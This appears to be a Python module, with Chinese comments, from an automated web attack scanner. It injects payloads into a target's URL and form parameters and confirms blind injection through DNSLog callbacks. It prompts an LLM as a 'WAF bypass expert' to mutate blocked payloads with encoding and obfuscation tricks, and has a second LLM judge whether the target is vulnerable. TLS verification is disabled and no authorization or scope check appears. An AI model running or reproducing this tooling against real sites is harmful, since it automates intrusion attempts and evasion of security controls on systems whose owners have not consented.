"""开火执行与 LLM Judge 研判器 — 精准投递 Payload + 大模型裁决。

接入 L4 主动扫描管线：
    extract_attack_surface() → generate_dynamic_payloads() → execute_and_evaluate()

v2: WAF 极限抗性循环 — 403 拦截自动 LLM 变异重试。
"""

from __future__ import annotations

import asyncio
import json as _json
import logging
import time as _time
from urllib.parse import urlencode, urljoin, urlparse, parse_qs, urlunparse

import httpx
import yaml
from pathlib import Path

from agent.llm_client import get_llm_client

_log = logging.getLogger(__name__)

_TRUNCATION_THRESHOLD = 6000
_HEAD_TAIL_SIZE = 3000
_MAX_WAF_RETRIES = 2

_WAF_BLOCK_KW = {"拦截", "blocked", "waf", "forbidden",
                 "access denied", "your request has been blocked",
                 "security policy", "请求被拦截", "非法请求",
                 "request rejected", "challenge"}


def _load_proxy() -> str:
    cfg_path = Path(__file__).resolve().parent.parent / "orchestrator" / "config.yaml"
    if cfg_path.exists():
        with open(cfg_path) as f:
            return (yaml.safe_load(f) or {}).get("http", {}).get("proxy", "")
    return ""


def _is_waf_block(status: int, body: str) -> bool:
    """检测是否被 WAF 拦截。"""
    if status == 403:
        return True
    bl = body[:500].lower()
    return any(kw in bl for kw in _WAF_BLOCK_KW)


_MUTATE_PROMPT = """你是一个顶级的 WAF 绕过专家。以下 Payload 被 WAF 拦截了，请为我生成一个变异版本。

【被拦截的 Payload】: {payload}
【测试类型】: {vuln_type}
【目标参数】: {target_param}

绕过技巧：URL 编码、大小写混合、内联注释 /**/、等价函数替换、空白符变异、Hex 编码、Unicode 规范化绕过。

⚠️ 只输出变异后的 Payload 原文，不要任何解释或标记。"""


async def _mutate_payload(
    payload: str,
    vuln_type: str,
    target_param: str,
    client,
    model: str,
) -> str | None:
    """调用 LLM 对 Payload 进行 WAF 规避变异。"""
    prompt = _MUTATE_PROMPT.format(
        payload=payload,
        vuln_type=vuln_type,
        target_param=target_param,
    )
    try:
        resp = await client.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content": "你只输出变异后的 Payload 原文，不输出任何其他内容。"},
                {"role": "user", "content": prompt},
            ],
            temperature=0.4,  # 少量随机性促进变异
            max_tokens=256,
        )
        mutated = (resp.choices[0].message.content or "").strip()
        # 清理常见杂音
        for tag in ("```", "'", '"'):
            mutated = mutated.strip(tag)
        if mutated and mutated != payload and len(mutated) < 1000:
            _log.info("payload_mutated original_len=%d mutated_len=%d",
                      len(payload), len(mutated))
            return mutated
    except Exception as e:
        _log.warning("mutate_payload_failed error=%s", e)
    return None


_JUDGE_PROMPT = """你是一个无情且极其敏锐的 Web 安全漏洞研判专家（LLM Judge）。
系统刚刚向目标发送了一个漏洞测试探针，请你根据实际的 HTTP 响应特征，判定漏洞是否真实存在。

【测试类型】: {vulnerability_type}
【测试参数】: {target_parameter}
【发送的 Payload】: {payload}
【预期的成功现象】: {expected_observation}

【实际响应时间】: {elapsed_time} 秒
【实际 HTTP 状态码】: {status_code}
【实际响应体片段】:
{truncated_response}

⚠️ 敏感度业务上下文评估（最高优先级）：
在判定信息泄露或未授权访问时，必须评估数据的「敏感度业务上下文」。
如果响应内容属于明显公开数据（如 BBS 论坛帖子、灌水内容、测试版块、RSS 订阅、
新闻列表、公开课表等），无论响应的数据格式如何（JSON/XML/HTML），都必须判定为
is_vulnerable: false, confidence: 0。
只有当数据涉及后台配置、密码/Token 凭证、内网拓扑、数据库报错/SQL 回显、
内部 API 路由及参数等高价值机密时，才判定 is_vulnerable: true。

请严格以 JSON 格式输出你的研判结果，不要有任何多余字符或 markdown 标记：
{{
  "is_vulnerable": true 或 false,
  "confidence": 0到100的整数,
  "evidence": "如果存在漏洞，请用一句话提取出响应体中的关键报错/回显作为证据。如果没有，填 null"
}}"""


async def execute_and_evaluate(
    target_url: str,
    attack_surface: dict,
    payloads: list[dict],
    api_key: str | None = None,
) -> list[dict]:
    """投递 Payload 并调用 LLM Judge 判定漏洞，遇 WAF 自动变异重试。

    Args:
        target_url: 目标 URL
        attack_surface: extract_attack_surface() 的产出
        payloads: generate_dynamic_payloads() 的产出
        api_key: DeepSeek API Key

    Returns:
        [{"vulnerability_type": str, "target_parameter": str, "payload": str,
          "evidence": str, "confidence": int, "response_status": int,
          "elapsed": float, "waf_evaded": bool}, ...]
    """
    url_params: dict = attack_surface.get("url_params", {})
    forms: list[dict] = attack_surface.get("forms", [])
    findings: list[dict] = []

    client, model = get_llm_client(api_key=api_key)
    proxy_url = _load_proxy()

    # ── DNSLog OOB 雷达初始化 ──
    dnslog = None
    try:
        from agent.dnslog_client import DNSLogClient
        dnslog = DNSLogClient()
        await dnslog.register()
    except ImportError:
        _log.warning("dnslog module unavailable, OOB detection disabled")

    async with httpx.AsyncClient(timeout=httpx.Timeout(15),
                                  proxy=proxy_url or None,
                                  verify=False,
                                  follow_redirects=False) as http_client:
        for pi in payloads:
            vuln_type = pi.get("vulnerability_type", "unknown")
            param = pi.get("target_parameter", "")
            payload_str = pi.get("payload", "")
            expected = pi.get("expected_observation", "")

            response_text = ""
            response_status = 0
            elapsed = 0.0
            waf_evaded = False

            # ── DNSLog OOB 占位符替换 ──
            oob_domain: str | None = None
            oob_enabled = dnslog and dnslog._registered and "{dnslog_domain}" in payload_str
            if oob_enabled:
                oob_task_id = f"{vuln_type}-{param}".replace(" ", "-")[:40]
                oob_domain = dnslog.generate_domain(oob_task_id)
                payload_str = payload_str.replace("{dnslog_domain}", oob_domain)
                _log.info("dnslog_replace param=%s domain=%s", param, oob_domain)

            # ── WAF 抗性循环 ──
            for attempt in range(1, _MAX_WAF_RETRIES + 2):  # 1 原始 + 2 变异
                try:
                    if param in url_params:
                        parsed = urlparse(target_url)
                        qs = parse_qs(parsed.query, keep_blank_values=True)
                        qs[param] = [payload_str]
                        new_query = urlencode(qs, doseq=True)
                        new_url = urlunparse(parsed._replace(query=new_query))
                        t0 = _time.monotonic()
                        resp = await http_client.get(new_url, headers={"Connection": "close"})
                        t1 = _time.monotonic()

                    elif _param_in_forms(param, forms):
                        form = _find_form_with_param(param, forms)
                        action = form.get("action", "") or target_url
                        if not action.startswith("http"):
                            action = urljoin(target_url, action)
                        method = form.get("method", "GET")
                        form_data = {}
                        for inp in form.get("inputs", []):
                            form_data[inp["name"]] = payload_str if inp["name"] == param else inp["name"]

                        t0 = _time.monotonic()
                        if method == "POST":
                            resp = await http_client.post(action, data=form_data, headers={"Connection": "close"})
                        else:
                            parsed = urlparse(action)
                            qs = parse_qs(parsed.query, keep_blank_values=True)
                            qs[param] = [payload_str]
                            new_query = urlencode(qs, doseq=True)
                            new_url = urlunparse(parsed._replace(query=new_query))
                            resp = await http_client.get(new_url, headers={"Connection": "close"})
                        t1 = _time.monotonic()

                    else:
                        parsed = urlparse(target_url)
                        sep = "&" if parsed.query else ""
                        new_query = parsed.query + sep + urlencode({param: payload_str})
                        new_url = urlunparse(parsed._replace(query=new_query))
                        t0 = _time.monotonic()
                        resp = await http_client.get(new_url, headers={"Connection": "close"})
                        t1 = _time.monotonic()

                    elapsed = t1 - t0
                    response_status = resp.status_code
                    response_text = resp.text

                except httpx.HTTPError as e:
                    _log.debug("executor_req_failed url=%s param=%s error=%s", target_url, param, e)
                    elapsed = 15
                    response_status = 0
                    response_text = str(e)
                except asyncio.TimeoutError:
                    _log.debug("executor_timeout url=%s param=%s", target_url, param)
                    elapsed = 15
                    response_status = 0
                    response_text = "timeout"

                # ── WAF 检测 → 变异重试 ──
                if _is_waf_block(response_status, response_text) and attempt <= _MAX_WAF_RETRIES:
                    _log.warning("waf_blocked attempt=%d/%d param=%s status=%d",
                                 attempt, _MAX_WAF_RETRIES + 1, param, response_status)
                    mutated = await _mutate_payload(payload_str, vuln_type, param, client, model)
                    if mutated:
                        payload_str = mutated
                        waf_evaded = True
                        await asyncio.sleep(2)  # 变异前多等一会，减缓节奏
                        continue
                    _log.info("waf_mutation_failed, proceeding with original response")

                break  # 非 WAF 或重试已用完

            # ── DNSLog OOB 轮询 (最高优先级仲裁) ──
            oob_positive = False
            oob_evidence = ""
            if oob_enabled and oob_domain and response_status != 0:
                # 等待 OOB 回连（强制 4 秒）
                await asyncio.sleep(4)
                records = await dnslog.poll_logs(oob_domain)
                if records:
                    types = [r.get("type", "?") for r in records]
                    ips = [r.get("ip", "?") for r in records]
                    oob_evidence = (
                        f"[+++] OOB 带外交互确认: {len(records)} 条记录 "
                        f"type={types} ip={ips} domain={oob_domain}"
                    )
                    oob_positive = True
                    _log.warning("DNSLOG_OOB_HIT domain=%s records=%d types=%s",
                                 oob_domain, len(records), types)

            if oob_positive:
                # 最高优先级: DNSLog 回连 → 直接判定漏洞存在
                findings.append({
                    "vulnerability_type": vuln_type,
                    "target_parameter": param,
                    "payload": payload_str,
                    "evidence": oob_evidence,
                    "confidence": 100,
                    "response_status": response_status,
                    "elapsed": round(elapsed, 3),
                    "waf_evaded": waf_evaded,
                    "oob_confirmed": True,
                })
                await asyncio.sleep(1.5)
                continue  # 跳过 LLM Judge

            # ── Token 保护截断 ──
            truncated = _truncate_response(response_text)

            # ── LLM Judge 裁判 ──
            prompt = _JUDGE_PROMPT.format(
                vulnerability_type=vuln_type,
                target_parameter=param,
                payload=payload_str,
                expected_observation=expected,
                elapsed_time=round(elapsed, 2),
                status_code=response_status,
                truncated_response=truncated,
            )

            try:
                resp = await client.chat.completions.create(
                    model=model,
                    messages=[
                        {"role": "system", "content": "你只输出 JSON，不输出任何其他内容。"},
                        {"role": "user", "content": prompt},
                    ],
                    temperature=0.0,
                    max_tokens=512,
                )
                raw = resp.choices[0].message.content or ""
            except Exception as e:
                _log.error("judge_llm_failed url=%s param=%s error=%s", target_url, param, e)
                raw = ""

            judge = _parse_judge_json(raw)
            if judge is None:
                _log.warning("judge_json_parse_failed url=%s param=%s raw=%s",
                             target_url, param, raw[:200])
                judge = {"is_vulnerable": False, "confidence": 0, "evidence": None}

            if (
                judge.get("is_vulnerable") is True
                and judge.get("confidence", 0) >= 80
            ):
                findings.append({
                    "vulnerability_type": vuln_type,
                    "target_parameter": param,
                    "payload": payload_str,
                    "evidence": judge.get("evidence"),
                    "confidence": judge["confidence"],
                    "response_status": response_status,
                    "elapsed": round(elapsed, 3),
                    "waf_evaded": waf_evaded,
                })

            # 射速控制
            await asyncio.sleep(1.5)

    return findings


# ── 辅助函数 ──

def _truncate_response(text: str) -> str:
    if len(text) <= _TRUNCATION_THRESHOLD:
        return text
    return (
        text[:_HEAD_TAIL_SIZE]
        + "\n...[内容已截断]...\n"
        + text[-_HEAD_TAIL_SIZE:]
    )


def _parse_judge_json(raw: str) -> dict | None:
    import re as _re
    text = raw.strip()
    try:
        return _json.loads(text)
    except _json.JSONDecodeError:
        pass
    m = _re.search(r"```(?:json)?\s*(.*?)\s*```", text, _re.DOTALL)
    if m:
        try:
            return _json.loads(m.group(1))
        except _json.JSONDecodeError:
            pass
    start = text.find("{")
    end = text.rfind("}") + 1
    if start >= 0 and end > start:
        try:
            return _json.loads(text[start:end])
        except _json.JSONDecodeError:
            pass
    return None


def _param_in_forms(param: str, forms: list[dict]) -> bool:
    for form in forms:
        for inp in form.get("inputs", []):
            if inp.get("name") == param:
                return True
    return False


def _find_form_with_param(param: str, forms: list[dict]) -> dict:
    for form in forms:
        for inp in form.get("inputs", []):
            if inp.get("name") == param:
                return form
    return {}
